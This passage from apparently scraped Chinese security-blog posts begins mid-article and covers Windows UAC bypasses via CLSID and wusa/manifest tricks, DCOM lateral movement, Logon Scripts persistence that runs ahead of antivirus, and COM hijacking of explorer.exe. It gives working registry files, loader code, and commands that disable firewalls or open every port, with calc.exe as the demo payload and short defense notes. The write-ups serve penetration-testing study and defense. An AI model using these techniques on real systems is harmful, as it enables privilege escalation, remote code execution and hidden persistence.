&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot; &quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\ProgId] @=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot; 注： 注册表项中的@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;表明，执行gpedit.msc时会调用该CLSID 生成test_managed.dll的c#代码如下： using System; using System.Diagnostics; namespace TestDotNet { public class Class1 { static Class1() { Process.Start(&quot;calc.exe&quot;); Environment.Exit(0); } } } 保存为TestDotNet.cs，编译成dll 使用csc.exe编译生成dll： C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library TestDotNet.cs 注： 使用.Net 4.0目录下的csc.exe 将生成的TestDotNet.dll重命名为test_managed.dll，成功绕过UAC，测试如下图 补充关于c#编译文件的一个技巧： 使用Visual Studio编译c#程序，如果项目名称同程序集名称(即命名空间namespace)不对应（结合本文，代码中程序集名称为TestDotNet，而新建的项目名却是Class1），需要重新指定程序集名称，如下图 同样，使用csc.exe编译生成文件也存在这个问题 例如将源代码保存为a.cs，那么在输出的时候必须加/out参数指定输出文件为TestDotNet.dll，这样程序集名称也默认为TestDotNet（同源代码对应），具体参数如下： C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library /out:TestDotNet.dll a.cs 否则，dll虽然能够被加载，但无法执行，如下图 2、{D5AB5662-131D-453D-88C8-9BBA87502ADE}注册表文件如下： Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}] @=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\Implemented Categories] [HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\Implemented Categories\{62C8FE65-4EBB-45e7-B440-6E39B2CDBF29}] [HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\InprocServer32] @=&quot;C:\\Windows\\System32\\mscoree.dll&quot; &quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot; &quot;Class&quot;=&quot;TestDotNet.Class1&quot; &quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot; &quot;ThreadingModel&quot;=&quot;Both&quot; &quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\InprocServer32\3.0.0.0] &quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot; &quot;Class&quot;=&quot;TestDotNet.Class1&quot; &quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot; &quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot; 注： 注册表项中的@=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot;，以下命令执行时会调用该CLSID： compmgmt.msc eventvwr.msc secpol.msc taskschd.msc 使用csc.exe编译dll： C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /t:library TestDotNet.cs 注： dll要使用.net 2.0编译 3、{0A29FF9E-7F9C-4437-8B11-F424491E3931}注册表文件如下： Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}] @=&quot;NDP SymBinder&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32] @=&quot;C:\\Windows\\System32\\mscoree.dll&quot; &quot;ThreadingModel&quot;=&quot;Both&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32\4.0.30319] @=&quot;4.0.30319&quot; &quot;ImplementedInThisVersion&quot;=&quot;&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ProgID] @=&quot;CorSymBinder_SxS&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server] @=&quot;C:\\Temp\\test_unmanaged.dll&quot; 测试系统为Win7和Win10，未成功，所以我对该脚本作了修改，修改后的文件如下： Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}] @=&quot;NDP SymBinder&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32] @=&quot;C:\\Temp\\test_unmanaged.dll&quot; &quot;ThreadingModel&quot;=&quot;Both&quot; 此处的test_unmanaged.dll同1和2的不同，这里需要一个标准dll，实现dll劫持，dll下载地址; https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll 执行以下代码均能触发dll劫持，实现UAC绕过： C:\Windows\System32\eventvwr.exe or C:\Windows\System32\mmc.exe CompMgmt.msc 注： 该利用方法b33f@FuzzySecurity在DefCon25也介绍过，详情可见如下链接： https://raw.githubusercontent.com/FuzzySecurity/DefCon25/master/Lab-Writeup.txt 4、{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}注册表文件如下： Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}] @=&quot;Microsoft Common Language Runtime Meta Data&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\InprocServer32] @=&quot;C:\\Windows\\System32\\mscoree.dll&quot; &quot;ThreadingModel&quot;=&quot;Both&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\InprocServer32\4.0.30319] @=&quot;4.0.30319&quot; &quot;ImplementedInThisVersion&quot;=&quot;&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\ProgID] @=&quot;CLRMetaData.CorRuntimeHost.2&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\Server] @=&quot;..\\..\\..\\..\\Temp\\test_unmanaged.dll&quot; 此处的test_unmanaged.dll同1和2的不同，这里需要一个标准dll，实现dll劫持，dll下载地址; https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll 执行secpol.msc触发dll劫持，测试如下图 0x04 补充使用Procmon记录gpedit.msc的启动过程，寻找可被利用的系统CLSID，寻找特征如下： 打开注册表键值HKCU:\Software\Classes\CLSID\{****}\InprocServer32，返回NAME NOT FOUND 打开注册表键值HKCR:\CLSID\{****}\InprocServer32，返回SUCCESS 如下图，标记的几个CLSID符合要求 在测试系统Win7 x86下共找到如下符合要求的CLSID： {8FC0B734-A0E1-11D1-A7D3-0000F87571E3} {B708457E-DB61-4C55-A92F-0D4B5E9B1224} {871C5380-42A0-1069-A2EA-08002B30309D} {D02B1F72-3407-48ae-BA88-E8213C6761F1} {B29D466A-857D-35BA-8712-A758861BFEA1} {D02B1F73-3407-48AE-BA88-E8213C6761F1} {B0395DA5-6A15-4E44-9F36-9A9DC7A2F341} {ADE6444B-C91F-4E37-92A4-5BB430A33340} 0x05 防御 监控注册表HKEY_CURRENT_USER\Software\Classes\CLSID\下键值的创建和修改 0x06 小结 微软不把UAC绕过作为漏洞，站在他们的角度可以理解。但在渗透测试中，常常会碰到需要绕过UAC的情况，某些UAC绕过方法往往还能作更多利用。站在防御的角度，提醒防御方对UAC绕过方法保持关注。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[域渗透——利用DCOM在远程系统执行程序]]></title>
    <url>%2Fposts%2Fce4fb900.html</url>
    <content type="text"><![CDATA[0x00 前言 在以前的文章《在远程系统上执行程序的技术整理》整理过域环境下常用的程序执行方法：at、psexec、WMIC、wmiexec、smbexec和powershell remoting，这次将基于Matt Nelson‏ @enigma0x3的研究，详细介绍在域环境下使用DCOM执行程序的方法，分析相关攻防思路。 学习链接如下： https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ 0x01 简介 本文将要介绍以下内容： DCOM使用介绍 实际利用思路 命令行配置防火墙的技巧 防御思路 0x02 DCOM使用介绍 相关基础知识暂略，关于DCOM的介绍可参考如下链接： https://msdn.microsoft.com/en-us/library/cc226801.aspx http://blog.csdn.net/ervinsas/article/details/36424127 本节主要选取Matt Nelson‏ @enigma0x3博客中的主要利用方法进行复现 获得DCOM的程序列表： powershell代码： Get-CimInstance Win32_DCOMApplication 注： Get-CimInstance只适用于Powershell 3.0及以上，Win7默认为2.0不支持，可使用以下替代命令： Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication 当然，直接使用wmic查询也可以，代码如下： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication GET /all /FORMAT:list powershell对WMI的调用可使用wmic命令进行替换，详情可参考： https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/ 1、对本机测试管理员权限，powershell代码如下: 获得&quot;MMC20.Application&quot;支持的操作： $com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;)) $com.Document.ActiveView | Get-Member 如下图 查看ExecuteShellCommand对应的参数说明： $com.Document.ActiveView.ExecuteShellCommand 如下图 ExecuteShellCommand对应的参数具体含义可参考以下链接： https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx 通过ExecuteShellCommand执行程序： $com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;)) $com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;) 2、对远程系统测试测试环境：域环境 Client：关闭防火墙 Server：获得域主机内置帐户administrator的口令，可net use连接至Client Server端管理员权限可选择执行如下powershell代码： 1.调用MMC20.Application $com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.0.2&quot;)) $com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;) 操作如下图 Clinet端查看程序列表，启动的calc.exe用户名为test2(Client端当前登录用户为a)，如下图 2.调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’ $com = [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.0.2&quot;) $obj = [System.Activator]::CreateInstance($com) $item = $obj.item() $item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0) Clinet端查看程序列表，启动的calc.exe用户名为a（同Client端当前登录用户名相同），如下图 注： 以上两种方式适用于Win7-Win10 3.调用’C08AFD90-F2A1-11D1-8455-00A0C91F3880’ $com = [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;192.168.0.2&quot;) $obj = [System.Activator]::CreateInstance($com) $obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0) 注： 该方法不适用于Win7，适用于Win10和Server2012 R2 0x03 实际利用思路 思路一：域环境未开启防火墙，直接使用当然，需要获得域内置帐户administrator的口令 方法不再赘述 思路二：默认开启防火墙，本地修改配置关闭防火墙这样，其他主机就可以远程操作该主机，可分别通过以下方式实现 1、通过配置入站规则支持DCOM 命令行开启任意端口的代码如下: netsh advfirewall firewall add rule name=&quot;any&quot; protocol=TCP dir=in localport=any action=allow 注： DCOM通信端口是由RPC动态分配，不固定，所以将入站端口规则设置为any 添加后，防火墙高级功能面板能发现添加的入站规则，如下图 2、关闭防火墙功能 Windows Firewall对应的服务名为mpssvc，使用sc命令可远程关闭防火墙服务，命令如下： sc \\192.168.0.2 stop mpssvc 但关闭防火墙服务并不能关闭防火墙功能，需要使用如下命令关闭防火墙功能： netsh advfirewall set currentprofile state off 注： 补充开启防火墙功能的命令： netsh advfirewall set currentprofile state on 3、通过防火墙配置文件设置入站规则 防火墙默认配置规则如下： 阻止与规则不匹配的入站连接 允许与规则不匹配的出站连接 如下图 修改规则，允许与规则不匹配的入站连接，命令如下： netsh advfirewall set currentprofile firewallpolicy allowinbound,allowoutbound 修改后，通过高级面板能够看到修改后的配置，如下图 此时,防火墙状态报警，如下图 还原防火墙配置的命令如下： netsh advfirewall set currentprofile firewallpolicy blockinbound,allowoutbound 思路三：远程修改防火墙配置可使用netsh远程配置防火墙规则，需要知道用户名密码，管理员权限执行如下命令： netsh -r 192.168.0.2 -u TEST\administrator -p domain123! advfirewall set currentprofile firewallpolicy allowinbound,allowoutbound 注： 对当前配置文件(即域配置文件)： netsh advfirewall set currentprofile settings remotemanagement enable 所有配置文件可以使用： netsh advfirewall set allprofiles settings remotemanagement enable 报错如下： An error occurred while attempting to connect to the remote computer. Make sure that the Windows Firewall service on the remote computer is running and configur ed to allow remote management, and then try your request again. 说明远程计算机不允许远程管理，远程计算机需要作如下设置： 允许Windows防火墙远程管理 默认不支持，选中打勾代表开启，如下图 注： 该操作可通过命令行实现，本地管理员权限执行： netsh advfirewall set currentprofile settings remotemanagement enable 该功能打开后，其他主机可远程管理本机防火墙配置： （管理员权限） netsh -r 192.168.0.2 -u TEST\administrator -p domain123! advfirewall firewall add rule name=&quot;any&quot; protocol=TCP dir=in localport=any action=allow 如下图 综上，利用DCOM在域控远程执行程序的思路如下： 1、获取域控权限 包括域控内置帐户administrator的口令，如果域控防火墙关闭，可直接远程执行程序 注： 如果想使用其他帐户远程连接，需要先通过dcomcnfg.exe进入COM安全，激活用户的远程启动和远程激活属性 2、预置后门 如果域控开启防火墙，无法直接使用DCOM远程执行，需要获得远程修改防火墙配置的权限，该权限可通过设置允许Windows防火墙远程管理（系统默认关闭）获得 该操作需要3389连接域控或是使用其他方法在域控主机上执行代码，管理员权限执行： netsh advfirewall set currentprofile settings remotemanagement enable 3、远程打开端口 使用netsh远程修改域控防火墙规则，打开端口 netsh -r 192.168.0.2 -u TEST\administrator -p domain123! advfirewall firewall add rule name=&quot;any&quot; protocol=TCP dir=in localport=any action=allow 4、远程执行 使用net use 远程连接，接着执行如下powershell代码： $com = [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.0.2&quot;) $obj = [System.Activator]::CreateInstance($com) $item = $obj.item() $item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0) 注： 选择使用&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;，执行程序的用户名为当前登录用户 5、远程恢复域控防火墙设置 netsh -r 192.168.0.2 -u TEST\administrator -p domain123! advfirewall firewall Delete rule name=&quot;any&quot; 0x04 防御 针对利用DCOM远程执行程序，只要开启防火墙即可 也可禁用内置帐户Administrator对COM的远程启动和远程激活权限，命令如下: dcomcnfg.exe 打开组件服务-我的电脑-属性-COM安全-启动和激活权限-编辑默认值，如下图 当然，通过抓包分析特征也是可以的 0x05 小结 本文对使用DCOM执行程序的方法作了利用分析，最后感谢Matt Nelson‏ @enigma0x3分享他的文章。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Empire中的Invoke-WScriptBypassUAC利用分析]]></title>
    <url>%2Fposts%2F6e73c1af.html</url>
    <content type="text"><![CDATA[0x00 前言 知名的后渗透测试框架Empire是一个很好的学习模板，其中包含的后渗透技巧很值得深入研究。 本文将要挑选Empire中一个经典的UAC绕过方法Invoke-WScriptBypassUAC进行分析，介绍绕过原理以及在渗透测试中的更多利用技巧。知道如何利用，才能知道如何防御。 Invoke-WScriptBypassUAC地址： https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-WScriptBypassUAC.ps1 0x01 简介 本文将要介绍如下内容： Invoke-WScriptBypassUAC绕过原理 利用扩展 防御检测 0x02 Invoke-WScriptBypassUAC绕过原理 Invoke-WScriptBypassUAC通过powershell实现，思路上借鉴了Vozzie分享的github，地址如下： https://github.com/Vozzie/uacscript Vozzie提到ZDI和微软选择忽略该UAC绕过“漏洞”，ZDI认为这不是一个远程漏洞，微软认为UAC绕过不属于漏洞范畴 Invoke-WScriptBypassUAC在实现上使用了一些实用的小技巧，所以本文主要对Invoke-WScriptBypassUAC的绕过方法进行分析 该方法只适用于Win7，而Win8、Win10不适用（原因在后面介绍） 测试系统： Win7 x86 由于powershell格式的源代码公开，所以直接介绍该脚本关键的操作流程： 判断操作系统是否为Win7，是否为普通权限 Temp目录释放文件wscript.exe.manifest 使用makecab.exe对wscript.exe.manifest和wscript.exe进行压缩 使用wusa将压缩包解压缩，将wscript.exe.manifest和wscript.exe释放至c:\Windows目录 payload保存在Appdata文件夹的ADS中 使用c:\Windows\wscript.exe执行payload，实现管理员权限执行payload，绕过UAC 0x03 利用扩展 掌握操作流程后，我们完全可以手动进行拆分测试，在这个过程中能发现更多利用思路 1、保存wscript.exe.manifest文件代码如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; &lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv3=&quot;urn:schemas-microsoft-com:asm.v3&quot; manifestVersion=&quot;1.0&quot;&gt; &lt;asmv3:trustInfo&gt; &lt;security&gt; &lt;requestedPrivileges&gt; &lt;requestedExecutionLevel level=&quot;RequireAdministrator&quot; uiAccess=&quot;false&quot;/&gt; &lt;/requestedPrivileges&gt; &lt;/security&gt; &lt;/asmv3:trustInfo&gt; &lt;asmv3:application&gt; &lt;asmv3:windowsSettings xmlns=&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;&gt; &lt;autoElevate&gt;true&lt;/autoElevate&gt; &lt;dpiAware&gt;true&lt;/dpiAware&gt; &lt;/asmv3:windowsSettings&gt; &lt;/asmv3:application&gt; &lt;/assembly&gt; 2、使用makecab制作cab文件cmd: makecab c:\windows\system32\wscript.exe %TMP%\1.tmp makecab wscript.exe.manifest %TMP%\2.tmp 3、使用wusa解压缩cab文件并释放至c:\windowscmd: wusa %TMP%\1.tmp /extract:&quot;c:\windows&quot; /quiet wusa %TMP%\2.tmp /extract:&quot;c:\windows&quot; /quiet 注： 该方法成功的关键在于使用wusa能够将cab文件解压缩至c:\windows，通常情况下，向c:\windows目录释放文件需要管理员权限，而借助wusa，普通用户权限即可，当然其他管理员权限的目录也可以，例如： C:\Windows\addins 4、使用该wscript.exe执行vbs或者js脚本cmd： c:\windows\wscript.exe c:\test\1.vbs c:\windows\wscript.exe c:\test\1.js 注： 此处js和vbs脚本需要绝对路径，虽然是普通用户权限的cmd，但因为wscript.exe同级目录下的wscript.exe.manifest指定以管理员权限启动，所以执行的vbs或者js脚本是管理员权限，这就实现了UAC绕过 执行cmd命令对应的vbs脚本如下: Dim objShell Dim oFso Set oFso = CreateObject(&quot;Scripting.FileSystemObject&quot;) Set objShell = WScript.CreateObject(&quot;WScript.Shell&quot;) command = &quot;cmd /c calc.exe&quot; objShell.Run command, 0 Set objShell = Nothing 对应的js脚本如下： new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;,0,true); 5、绕过后清除缓存文件删除c:\windows\下的wscript.exe和wscript.exe.manifest 对应vbs脚本如下: Dim objShell Dim oFso Set oFso = CreateObject(&quot;Scripting.FileSystemObject&quot;) Set objShell = WScript.CreateObject(&quot;WScript.Shell&quot;) command = &quot;cmd /c del c:\windows\wscript.exe &amp;&amp; del c:\windows\wscript.exe.manifest&quot; objShell.Run command, 0 Set objShell = Nothing 对应js脚本如下： new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c del c:\\windows\\wscript.exe &amp;&amp; del c:\\windows\\wscript.exe.manifest&quot;,0,true); 注： 删除c:\windows\下的wscript.exe和wscript.exe.manifest需要管理员权限 删除缓存文件： del %TMP%\1.tmp del %TMP%\2.tmp 6、补充(1)可供利用的路径有很多，查看文件夹属性可使用如下powershell命令： Get-Acl -Path c:\windows|select Owner (2)保存vbs或者js脚本的路径有很多，例如特殊ads： …文件 特殊COM文件 磁盘根目录 更多细节可参考文章《Hidden Alternative Data Streams的进阶利用技巧》 当然，Invoke-WScriptBypassUAC使用的ADS位置也很隐蔽 $env:USERPROFILE\AppData默认为系统隐藏文件 所以使用dir /r看不到文件夹$env:USERPROFILE\AppData，当然也无法看到添加的ads 需要使用dir /a:h /r （/a:h指定查看系统隐藏文件）才能看到，或者查看所有文件：dir /a /r (3)Win8失败的原因 使用makecab和wusa能够将cab文件解压缩至高权限目录，如c:\windows 但利用wscript.exe和wscript.exe.manifest实现高权限执行的方法失效，Win8使用了内嵌manifest (4)Win10失败的原因 Win10系统无法使用makecab和wusa能够将cab文件解压缩至高权限目录，如c:\windows 当然，也使用了内嵌manifest 0x04 wusa特性的进一步利用 wusa特性： 在普通用户的权限下，能够将文件释放至管理员权限的文件夹 适用Win7、Win8 利用一：文件名劫持1、将calc.exe重命名为regedit.com 2、在c:\windows释放文件regedit.com cmd： makecab c:\test\regedit.com %TMP%\1.tmp wusa %TMP%\1.tmp /extract:&quot;c:\windows&quot; /quiet 3、劫持 cmd输入regedit，会执行regedit.com，而不是regedit.exe 关于该利用方法的详情可参考文章：《A dirty way of tricking users to bypass UAC》 其他利用方法(暂略)0x05 防御 该UAC绕过方法只适用于Win7，尚未见到对应补丁，杀毒软件能对此脚本进行拦截，但也存在绕过方法 站在防御者的角度，建议监控wusa.exe的调用 0x06 小结 本文对Invoke-WScriptBypassUAC进行了分析，虽然微软不认可该漏洞，但在后渗透阶段，不论是渗透测试人员，还是防御方，对此都应该注意。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use Logon Scripts to maintain persistence]]></title>
    <url>%2Fposts%2F1b2078cc.html</url>
    <content type="text"><![CDATA[0x00 前言 依旧是对后门利用方法做介绍，本次介绍的是使用Logon Scripts的方法。然而我在研究过程中发现了一个特别的用法，脚本优先于杀毒软件执行，能够绕过杀毒软件对敏感操作的拦截，本文将要具体介绍这个技巧。 注: 有些杀毒软件是可以做到优先于Logon Scripts启动的 0x01 简介 Logon Scripts用法 绕过360对wmi调用的拦截 特别用法 0x02 Logon Scripts用法 思路来自于Adam@Hexacorn，地址如下： http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/ 简要介绍Logon Scripts的用法注册表路径：HKCU\Environment\ 创建字符串键值： UserInitMprLogonScript 键值设置为bat的绝对路径：c:\test\11.bat 如下图 bat内容如下： start calc.exe 注销，登录 执行脚本11.bat，弹出计算器 0x03 绕过360对通过wmi修改环境变量的拦截 在之前的文章《Use CLR to maintain persistence》提到过使用wmic修改环境变量的方法 命令如下： wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot; wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;{11111111-1111-1111-1111-111111111111}&quot; 然而，360会对WMI的操作进行拦截，如下图 其实通过WMI添加环境变量等价于在注册表HKCR\Environment\新建键值 所以对WMI的操作可以通过写注册表的操作进行代替 以上WMI命令可替换为如下powershell代码： New-ItemProperty &quot;HKCU:\Environment\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-Null New-ItemProperty &quot;HKCU:\Environment\&quot; COR_PROFILER -value &quot;{11111111-1111-1111-1111-111111111111}&quot; -propertyType string | Out-Null 0x04 特别用法 源于我的一个特别的想法 我在对该技巧研究的过程中，产生了一个有趣的想法，Logon Scripts启动的顺序是否优先于其他程序呢？ 如果是的话，那么是否也优先于杀毒软件呢？ 下面开始我的测试： 1、cmd输入如下代码wmic ENVIRONMENT create name=&quot;test&quot;,username=&quot;%username%&quot;,VariableValue=&quot;I run faster!&quot; 不出意外，被拦截 2、设置Logon Scripts11.bat代码如下： wmic ENVIRONMENT create name=&quot;test&quot;,username=&quot;%username%&quot;,VariableValue=&quot;I run faster!&quot; reg query HKEY_CURRENT_USER\Environment /V test pause 3、启用Logon Scripts注册表路径：HKCR\Environment\ 创建字符串键值： UserInitMprLogonScript 键值设置为bat的绝对路径：c:\test\11.bat 由于调用WMI会被拦截，可以通过powershell实现，代码如下： New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null 4、注销，重新登录，测试如果注册表HKCR\Environment\成功被写入键值test REG_SZ I run faster!，说明Logon Scripts优先于杀毒软件执行，绕过杀毒软件的限制 完整操作如下图 测试成功，验证我们的结论 0x05 防御 监控注册表键值HKCR\Environment\UserInitMprLogonScript 0x06 小结 本文对Logon Scripts的用法进行了测试，并且介绍了一个特别用法，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。站在防御的角度，要对此保持警惕。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use COM Object hijacking to maintain persistence——Hijack explorer.exe]]></title>
    <url>%2Fposts%2Fe6986d9.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章介绍了两种利用COM对象劫持实现的后门，利用思路有一些区别： 第一种，通过CLR劫持.Net程序正常CLR的用法： 设置注册表键值HKEY_CURRENT_USER\Software\Classes\CLSID\ cmd下输入： SET COR_ENABLE_PROFILING=1 SET COR_PROFILER={11111111-1111-1111-1111-111111111111} CLR能够劫持当前cmd下所有.Net程序的启动 后门利用思路： 我尝试通过WMI修改环境变量，使CLR作用于全局，就能够劫持所有.Net程序的启动 经实际测试，该方法有效，系统启动后默认会调用.Net程序，加载CLR，后门触发 第二种，劫持CAccPropServicesClass和MMDeviceEnumerator该方法曾被木马COMpfun使用，所以思路也是从COMpfun学到的 设置注册表键值HKEY_CURRENT_USER\Software\Classes\CLSID\能够指定实例CAccPropServicesClass和MMDeviceEnumerator对应加载的dll 而IE浏览器进程iexplore.exe启动时会调用以上两个实例 所以通过注册表设置CAccPropServicesClass和MMDeviceEnumerator对应加载的dll，能够劫持IE浏览器的启动，实现后门触发 当然，该方法只能算得上是一个被动后门，只有用户启动IE浏览器，才能触发后门 然而，在众多COM对象中，可供利用的劫持对象不唯一，甚至存在能够劫持桌面进程explorer.exe的方法，相当于一个主动后门 例如：劫持MruPidlList 注： 该方法曾被多个已知的恶意软件使用 本着通过研究所有已公开的COM对象后门利用方法，进而总结应对COM劫持防御方法的原则，本文将要介绍另外两种COM劫持的后门利用方法 之前的文章： 《Use CLR to maintain persistence》 《Use COM Object hijacking to maintain persistence——Hijack CAccPropServicesClass and MMDeviceEnumerator》 0x01 简介 本文将要介绍以下内容 通过劫持MruPidlList实现的后门思路 恶意利用实例 总结应对COM劫持的防御方法 0x02 通过劫持MruPidlList实现的后门思路 注册表位置：HKCU\Software\Classes\CLSID\ 创建项{42aedc87-2188-41fd-b9a3-0c966feabec1} 创建子项InprocServer32 Default的键值为测试dll的绝对路径：C:\test\calc.dll 创建键值： ThreadingModel REG_SZ Apartment 如下图 该注册表位置对应COM对象MruPidlList，作用于shell32.dll 而shell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能 直观的理解，explorer.exe会调用shell32.dll，加载COM对象MruPidlList 系统在启动时默认启动进程explorer.exe，如果劫持了COM对象MruPidlList，就能劫持进程explorer.exe，实现后门随系统开机启动，相当于是主动后门 当然，为便于测试，不需要重启系统，结束进程explorer.exe再新建进程explorer.exe就好 新建进程后，加载calc.dll，弹出计算器，如下图 测试64位系统，注册表位置不变，但是需要换用64位dll，重启时后门触发，启动calc.exe，如下图 Win8系统同样适用，如下图 0x03 恶意利用实例 1、COMRAT怀疑与Uroburos和Agent.BTZ同源 Uroburos：至今发现的最先进rootkit恶意程序之一 Agent.BTZ：一款在2008年用于渗透五角大楼的恶意软件 详细资料： https://www.nsec.io/wp-content/uploads/2015/05/uroburos-actors-tools-1.1.pdf 2、ZeroAccess rootkitZeroAccess rootkit：感染过大约900多万台计算机 详细资料： https://nakedsecurity.sophos.com/2012/06/06/zeroaccess-rootkit-usermode/ https://www.sophos.com/en-us/threat-center/technical-papers/zeroaccess-botnet.aspx 注： ZeroAccess rootkit还使用过另一个COM劫持的位置 注册表位置：HKCU\Software\Classes\clsid\{fbeb8a05-beee-4442-804e-409d6c4515e9} 利用方法同上，也能够劫持explorer.exe 3、BBSRAT详细资料： https://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ http://2014.zeronights.org/assets/files/slides/roaming_tiger_zeronights_2014.pdf 0x04 防御 由于COM对象是操作系统的正常功能，禁用COM对象不太现实 以下键值指向的dll路径应该特别注意： HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1} HKCU\Software\Classes\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9} HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} 